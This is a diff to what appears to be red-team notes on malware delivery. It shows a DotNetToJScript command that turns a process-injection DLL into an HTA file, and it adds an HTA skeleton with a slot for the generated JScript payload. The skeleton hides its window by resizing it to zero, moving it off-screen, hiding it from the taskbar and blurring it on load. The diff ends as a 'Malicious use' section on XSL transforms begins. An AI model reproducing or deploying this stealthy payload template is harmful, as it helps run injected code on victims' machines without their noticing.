@@ -668,7 +668,31 @@ mshta test.hta
 ```cmd
  .\DotNetToJScript\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe InjectToJscriptCsWin32.dll --lang=Jscript --ver=2 -o Downloads\test.hta' -c InjectToJscriptCsWin32.Class1
 ```
+- Better hta skeleton
+```html
+<html>
+<head>
+<script language="JScript">
 
+<!-- ADD output from DotNetToJScript here. -->
+
+window.resizeTo(0, 0);
+window.moveTo(-32000, -32000);
+</script>
+<hta:application 
+    showInTaskbar="no" 
+    border="none" 
+    caption="no" 
+    maximizeButton="no" 
+    minimizeButton="no" 
+    sysMenu="no" 
+    scroll="no"
+/>
+</head>
+<body onload="window.blur();">
+</body>
+</html>
+```
 
 ### XSL Transform
 #### Malicious use
